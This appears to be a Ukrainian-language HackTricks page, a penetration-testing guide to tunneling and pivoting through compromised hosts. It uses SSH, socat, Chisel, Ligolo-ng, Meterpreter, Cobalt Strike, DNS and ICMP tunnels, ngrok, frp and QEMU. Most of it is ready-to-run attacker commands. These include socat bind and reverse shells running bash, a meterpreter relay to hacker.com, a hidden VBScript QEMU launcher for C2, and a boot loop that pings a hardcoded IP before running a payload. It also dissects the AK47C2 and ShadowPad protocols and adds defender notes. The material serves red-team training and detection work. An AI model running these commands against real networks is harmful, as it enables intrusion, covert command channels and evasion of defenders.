# Тунелювання та перенаправлення портів

{{#include ../banners/hacktricks-training.md}}

## Порада щодо Nmap

> [!WARNING]
> **ICMP** та **SYN** сканування не можна тунелювати через socks proxies, тому для цього потрібно **вимкнути виявлення ping** (`-Pn`) і вказати **TCP сканування** (`-sT`).

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Графічне підключення SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Відкрити новий порт на SSH Server --> Інший порт
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Локальний порт --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Локальний порт --> Скомпрометований хост (SSH) --> Куди завгодно
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Це корисно для отримання reverse shells з внутрішніх хостів через DMZ на ваш хост:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Вам потрібен **root на обох пристроях** (оскільки ви збираєтеся створювати нові інтерфейси), а конфігурація sshd має дозволяти вхід root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Увімкнення форвардингу на стороні сервера
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Встановіть новий маршрут на стороні клієнта
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Безпека – атака Terrapin (CVE-2023-48795)**
> Атака пониження версії Terrapin 2023 року дає змогу зловмиснику посередині втручатися в початковий SSH handshake і впроваджувати дані в **будь-який forwarded channel** ( `-L`, `-R`, `-D` ). Переконайтеся, що client і server оновлені (**OpenSSH ≥ 9.6/LibreSSH 6.7**), або явно вимкніть вразливі алгоритми `chacha20-poly1305@openssh.com` і `*-etm@openssh.com` у `sshd_config`/`ssh_config`, перш ніж покладатися на SSH tunnels.

## SSHUTTLE

Ви можете **tunnel** через **ssh** увесь **трафік** до **підмережі** через host.\
Наприклад, перенаправити весь трафік, що надходить до 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Підключення за допомогою приватного ключа
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Локальний порт --> Compromised host (активна сесія) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Інший спосіб:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Відкрийте порт на teamserver, який прослуховує всі інтерфейси та може використовуватися для **маршрутизації трафіку через beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> У цьому випадку **порт відкривається на хості beacon**, а не на Team Server, і трафік надсилається на Team Server, а звідти — на вказаний host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Зверніть увагу:

- Reverse port forward у Beacon призначений для **тунелювання трафіку до Team Server, а не для ретрансляції між окремими машинами**.
- Трафік **тунелюється всередині C2-трафіку Beacon**, включно з P2P-з'єднаннями.
- **Для створення reverse port forward на високих портах права адміністратора не потрібні**.

### rPort2Port local

> [!WARNING]
> У цьому випадку **порт відкривається на хості beacon**, а не на Team Server, і **трафік надсилається до клієнта Cobalt Strike** (а не до Team Server), а звідти — до вказаного host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Вам потрібно завантажити вебфайл для тунелю: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Завантажити його можна зі сторінки релізів [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Потрібно використовувати **однакову версію для клієнта та сервера**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Use the same version for agent and proxy**

### Тунелювання
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Прив'язка агента та прослуховування
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Доступ до локальних портів агента
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Реверсний тунель. Тунель запускається на стороні жертви.\
Створюється socks4 proxy на 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot через **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port через socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter через SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Ви можете обійти **проксі без автентифікації**, виконавши цей рядок замість останнього в консолі жертви:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Створіть сертифікати з обох боків: клієнта та сервера
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Підключіть локальний SSH-порт (22) до порту 443 хоста атакуючого.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Це консольна версія PuTTY (параметри дуже схожі на параметри ssh-клієнта).

Оскільки цей binary буде виконано на машині жертви і він є ssh-клієнтом, нам потрібно відкрити наш ssh-сервіс і порт, щоб отримати зворотне з'єднання. Потім, щоб перенаправити порт, доступний лише локально, на порт на нашій машині:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Вам потрібні права локального адміністратора (для будь-якого порту)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Вам потрібно мати **RDP-доступ до системи**.\
Завантажте:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) із функції Remote Desktop Service у Windows. DVC відповідає за **тунелювання пакетів через RDP-з'єднання**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

На вашому клієнтському комп'ютері завантажте **`SocksOverRDP-Plugin.dll`** таким чином:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Тепер ми можемо **підключитися** до **victim** через **RDP** за допомогою **`mstsc.exe`**, і маємо отримати **повідомлення** про те, що **SocksOverRDP plugin** увімкнено, і він **слухатиме** на **127.0.0.1:1080**.

**Підключіться** через **RDP** і завантажте та виконайте на машині victim бінарний файл `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Тепер підтвердьте на своїй машині (атакуючій), що порт 1080 прослуховується:
```
netstat -antb | findstr 1080
```
Тепер ви можете використовувати [**Proxifier**](https://www.proxifier.com/) **для проксіювання трафіку через цей порт.**

## Проксіювання Windows GUI-застосунків

Ви можете змусити Windows GUI-застосунки працювати через проксі за допомогою [**Proxifier**](https://www.proxifier.com/).\
У **Profile -> Proxy Servers** додайте IP-адресу та порт SOCKS-сервера.\
У **Profile -> Proxification Rules** додайте назву програми, яку потрібно проксіювати, і підключення до IP-адрес, які потрібно проксіювати.

## NTLM proxy bypass

Згаданий раніше інструмент: **Rpivot**\
**OpenVPN** також може обійти його, якщо встановити ці параметри у файлі конфігурації:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Він автентифікується через proxy і прив'язує локальний порт, який перенаправляється до вказаного зовнішнього сервісу. Потім ви можете використовувати через цей порт потрібний вам інструмент.\
Наприклад, перенаправити порт 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Тепер, якщо, наприклад, налаштувати на **SSH**-сервісі жертви прослуховування порту 443, ви можете підключитися до нього через порт 2222 атакуючої системи.\
Ви також можете використовувати **meterpreter**, який підключається до localhost:443, тоді як атакуюча система прослуховує порт 2222.

## YARP

Reverse proxy, створений Microsoft. Ви можете знайти його тут: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root потрібен в обох системах для створення tun adapters і тунелювання даних між ними за допомогою DNS-запитів.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Тунель буде дуже повільним. Ви можете створити стиснене SSH-з’єднання через цей тунель, використовуючи:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Завантажити звідси**](https://github.com/iagox86/dnscat2)**.**

Створює канал C\&C через DNS. Не потребує привілеїв root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **У PowerShell**

Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), щоб запустити клієнт dnscat2 у PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Перенаправлення портів за допомогою dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Зміна DNS у proxychains

Proxychains перехоплює libc-виклик `gethostbyname` і тунелює TCP DNS-запит через socks proxy. За **замовчуванням** DNS-сервером, який використовує proxychains, є **4.2.2.2** (hardcoded). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви перебуваєте у **Windows-середовищі**, можна вказати IP **domain controller**.

## Тунелі в Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Актор Storm-2603 створив **двоканальний C2 ("AK47C2")**, який зловживає *лише* вихідним трафіком **DNS** і **звичайними HTTP POST** — двома протоколами, які рідко блокуються у корпоративних мережах.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Генерує випадковий 5-символьний SessionID (наприклад, `H4T14`).
• Додає `1` для *запитів завдань* або `2` для *результатів* і об'єднує різні поля (прапорці, SessionID, ім'я комп'ютера).
• Кожне поле **XOR-зашифровується ASCII-ключем `VHBD@H`**, кодується у hex і з'єднується крапками — зрештою додається домен, контрольований атакувальником:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Для запитів використовується `DnsQuery()` для записів **TXT** (і резервних записів **MG**).
• Коли відповідь перевищує 0xFF байт, backdoor **фрагментує** дані на частини по 63 байти та вставляє маркери:
`s<SessionID>t<TOTAL>p<POS>`, щоб C2-сервер міг змінити їхній порядок.

2. **HTTP mode (AK47HTTP)**
• Створює JSON-обгортку:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Увесь blob XOR-шифрується ключем `VHBD@H` → hex → надсилається як тіло **`POST /`** із заголовком `Content-Type: text/plain`.
• Відповідь використовує те саме кодування, а поле `cmd` виконується через `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Шукайте незвичайні **TXT-запити**, перша мітка яких містить довгий hex і які завжди закінчуються одним рідкісним доменом.
• Постійний XOR-ключ, за яким іде ASCII-hex, легко виявити за допомогою YARA: `6?56484244?484` (`VHBD@H` у hex).
• Для HTTP позначайте POST-запити з `text/plain`, тіла яких містять лише hex і мають кількість байтів, кратну двом.

{{#note}}
Увесь канал працює в межах **стандартних RFC-сумісних запитів**, а кожна sub-domain label має довжину менш як 63 байти, що робить його прихованим у більшості DNS-логів.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

В обох системах потрібен Root, щоб створити tun-адаптери та тунелювати дані між ними за допомогою ICMP echo-запитів.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Завантажте його звідси**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **— це інструмент для відкриття доступу до рішень через Internet за допомогою одного командного рядка.**\
_URI для доступу мають вигляд:_ **UID.ngrok.io**

### Installation

- Створіть account: https://ngrok.com/signup
- Завантаження Client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Основні способи використання

**Документація:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_За потреби також можна додати автентифікацію та TLS._

#### Тунелювання TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Надання доступу до файлів через HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Перехоплення HTTP-викликів

_Корисно для XSS,SSRF,SSTI ..._\
Безпосередньо зі stdout або в HTTP-інтерфейсі [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Тунелювання внутрішнього HTTP-сервісу
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Простий приклад конфігурації ngrok.yaml

Він відкриває 3 тунелі:

- 2 TCP
- 1 HTTP зі статичними файлами з `/tmp/httpbin/`
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Демон Cloudflare `cloudflared` може створювати вихідні тунелі, які відкривають доступ до **локальних TCP/UDP-сервісів** без необхідності вхідних правил firewall, використовуючи edge Cloudflare як точку зустрічі. Це дуже зручно, коли egress firewall дозволяє лише HTTPS-трафік, а вхідні підключення заблоковані.

### Однорядкова команда для швидкого тунелю
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Постійні тунелі через DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Запустіть конектор:
```bash
cloudflared tunnel run mytunnel
```
Оскільки весь трафік залишає хост **outbound через 443**, тунелі Cloudflared — це простий спосіб обійти ingress ACL або межі NAT. Зверніть увагу, що бінарний файл зазвичай запускається з підвищеними привілеями — за можливості використовуйте контейнери або прапорець `--user`.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) — це reverse-proxy на Go, який активно підтримується та підтримує **TCP, UDP, HTTP/S, SOCKS і P2P NAT-hole-punching**. Починаючи з **v0.53.0 (травень 2024 року)**, він може працювати як **SSH Tunnel Gateway**, тому target host може підняти reverse tunnel, використовуючи лише стандартний OpenSSH client — додатковий бінарний файл не потрібен.

### Класичний reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Використання нового SSH-шлюзу (без бінарного файлу frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Наведена вище команда публікує порт жертви **8080** як **attacker_ip:9000** без розгортання додаткових інструментів — ідеально для pivoting за принципом living-off-the-land.

## Covert VM-based Tunnels with QEMU

QEMU’s user-mode networking (`-netdev user`) підтримує опцію під назвою `hostfwd`, яка **прив’язує TCP/UDP-порт на *host* і перенаправляє його до *guest***. Коли guest запускає повноцінний SSH daemon, правило hostfwd надає disposable SSH jump box, що повністю працює всередині ephemeral VM — ідеально для приховування C2-трафіку від EDR, оскільки вся malicious activity та файли залишаються на virtual disk.<sup>[[1]](#references)</sup>

### Quick one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Наведена вище команда запускає образ **Tiny Core Linux** (`tc.qcow2`) в оперативній пам'яті.
• Порт **2222/tcp** на Windows host прозоро перенаправляється на **22/tcp** усередині guest.
• З погляду атакувальника ціль просто відкриває порт 2222; усі пакети, що до нього надходять, обробляються SSH server, запущеним у VM.

### Stealthy запуск через VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Запуск скрипта с помощью `cscript.exe //B update.vbs` залишає вікно прихованим.

### Персистентність у гостьовій системі

Оскільки Tiny Core не зберігає стан, зловмисники зазвичай:

1. Зберігають payload у `/opt/123.out`
2. Додають до `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Додають `home/tc` і `opt` до `/opt/filetool.lst`, щоб payload пакувався у `mydata.tgz` під час завершення роботи.

### Чому це уникає виявлення

• Лише два непідписані виконувані файли (`qemu-system-*.exe`) записуються на диск; драйвери або служби не встановлюються.
• Засоби захисту на host бачать **безпечний loopback-трафік** (фактичний C2 завершується всередині VM).
• Сканери пам'яті ніколи не аналізують простір процесів зі шкідливим кодом, оскільки він працює в іншій OS.

### Поради для Defender

• Створюйте сповіщення про **неочікувані бінарні файли QEMU/VirtualBox/KVM** у шляхах, доступних для запису користувачам.
• Блокуйте вихідні з'єднання, джерелом яких є `qemu-system*.exe`.
• Шукайте рідкісні порти, що прослуховуються (2222, 10022, …) і прив'язуються одразу після запуску QEMU.

## IIS/HTTP.sys relay nodes через `HttpAddUrl` (ShadowPad)

IIS-модуль ShadowPad угруповання Ink Dragon перетворює кожен скомпрометований perimeter web server на багатофункціональний **backdoor + relay**, прив'язуючи приховані URL-префікси безпосередньо на рівні HTTP.sys:<sup>[[3]](#references)</sup>

* **Config defaults** – якщо JSON-конфігурація модуля не містить значень, використовуються правдоподібні defaults IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Завдяки цьому на безпечний трафік IIS відповідає з коректним branding.
* **Wildcard interception** – оператори задають розділений крапками з комою список URL-префіксів (wildcards у host + path). Модуль викликає `HttpAddUrl` для кожного запису, тому HTTP.sys маршрутизує відповідні запити до malicious handler *до того*, як запит потрапить до модулів IIS.
* **Encrypted first packet** – перші два байти body запиту містять seed для custom 32-bit PRNG. Кожен наступний байт XOR-иться зі згенерованим keystream перед розбором протоколу:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – модуль підтримує два списки: «servers» (upstream nodes) і «clients» (downstream implants). Записи видаляються, якщо heartbeat не надходить протягом приблизно 30 секунд. Коли обидва списки непорожні, він поєднує перший справний server із першим справним client і просто передає байти між їхніми socket до закриття одного з боків.
* **Debug telemetry** – необов'язкове logging записує source IP, destination IP і загальну кількість пересланих байтів для кожного pairing. Дослідники використали ці breadcrumbs, щоб відновити ShadowPad mesh, що охоплював кілька жертв.

---

## Інші інструменти для перевірки

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Ховаючись у тіні: приховані тунелі через віртуалізацію QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Дослідження Check Point – До ToolShell: аналіз попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Дослідження Check Point – Усередині Ink Dragon: розкриття relay network та внутрішньої роботи прихованої offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
